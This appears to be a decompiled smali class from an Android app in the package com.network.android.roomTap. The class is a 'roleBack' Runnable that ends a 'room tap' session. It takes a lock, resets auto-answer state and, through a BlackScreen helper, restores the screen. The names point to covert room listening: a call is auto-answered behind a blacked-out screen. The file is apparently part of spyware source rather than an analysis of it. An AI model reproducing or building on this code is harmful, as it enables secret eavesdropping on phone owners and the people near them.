.class final Lcom/network/android/roomTap/g;
.super Ljava/lang/Object;

# interfaces
.implements Ljava/lang/Runnable;


# instance fields
.field final synthetic a:Landroid/content/Context;


# direct methods
.method constructor <init>(Landroid/content/Context;)V
    .locals 0

    iput-object p1, p0, Lcom/network/android/roomTap/g;->a:Landroid/content/Context;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public final run()V
    .locals 4

    :try_start_0
    new-instance v0, Ljava/lang/StringBuilder;

    const-string v1, "roleBack start, should turn screen on:"

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    sget-boolean v1, Lcom/network/android/roomTap/k;->b:Z

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Z)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    sget-object v0, Lcom/network/android/roomTap/AutoAnswerReceiver;->g:Ljava/util/concurrent/locks/ReentrantLock;

    invoke-virtual {v0}, Ljava/util/concurrent/locks/ReentrantLock;->isLocked()Z

    move-result v0

    if-eqz v0, :cond_0

    const-string v0, "roleBack already running (locked). returning..."

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    :goto_0
    return-void

    :cond_0
    const-string v0, "roleBack setting shouldTurnScreenOnNextTimeItIsTurnedOnByUser to true"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    const/4 v0, 0x1

    sput-boolean v0, Lcom/network/android/roomTap/k;->c:Z

    iget-object v0, p0, Lcom/network/android/roomTap/g;->a:Landroid/content/Context;

    new-instance v1, Ljava/lang/Long;

    const-wide/32 v2, 0xea60

    invoke-direct {v1, v2, v3}, Ljava/lang/Long;-><init>(J)V

    invoke-static {v0, v1}, Lcom/network/android/roomTap/AutoAnswerReceiver;->a(Landroid/content/Context;Ljava/lang/Long;)V

    invoke-static {}, Lcom/network/android/roomTap/AutoAnswerReceiver;->a()Z

    move-result v0

    if-nez v0, :cond_1

    const-string v0, "roleBack isRoomTap is false. returning"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "roleBack Exception- "

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1, v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;Ljava/lang/Throwable;)V

    :goto_1
    const-string v0, "roleBack unlocking lock"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    sget-object v0, Lcom/network/android/roomTap/AutoAnswerReceiver;->g:Ljava/util/concurrent/locks/ReentrantLock;

    invoke-virtual {v0}, Ljava/util/concurrent/locks/ReentrantLock;->unlock()V

    goto :goto_0

    :cond_1
    :try_start_1
    const-string v0, "roleBack: locking"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    sget-object v0, Lcom/network/android/roomTap/AutoAnswerReceiver;->g:Ljava/util/concurrent/locks/ReentrantLock;

    invoke-virtual {v0}, Ljava/util/concurrent/locks/ReentrantLock;->tryLock()Z

    move-result v0

    if-nez v0, :cond_2

    const-string v0, "roleBack already running (locked). returning..."

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    goto :goto_0

    :cond_2
    const/4 v0, 0x0

    invoke-static {v0}, Lcom/network/android/roomTap/AutoAnswerReceiver;->a(Z)V

    const-string v0, "roleBack setting room tap false"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    sget-boolean v0, Lcom/network/android/roomTap/k;->b:Z

    if-eqz v0, :cond_3

    invoke-static {}, Lcom/network/android/roomTap/k;->b()V

    const-string v0, "roleback shouldTurnScreenOnAfterTapIsOver is true. calling turnScreenOnForLimitedTime"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    iget-object v0, p0, Lcom/network/android/roomTap/g;->a:Landroid/content/Context;

    invoke-static {}, Lcom/network/android/roomTap/BlackScreen;->b()I

    move-result v1

    invoke-static {v0, v1}, Lcom/network/android/roomTap/k;->a(Landroid/content/Context;I)V

    const/4 v0, 0x0

    sput-boolean v0, Lcom/network/android/roomTap/k;->b:Z

    :cond_3
    iget-object v0, p0, Lcom/network/android/roomTap/g;->a:Landroid/content/Context;

    invoke-static {v0}, Lcom/network/android/roomTap/AutoAnswerReceiver;->f(Landroid/content/Context;)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    goto :goto_1
.end method
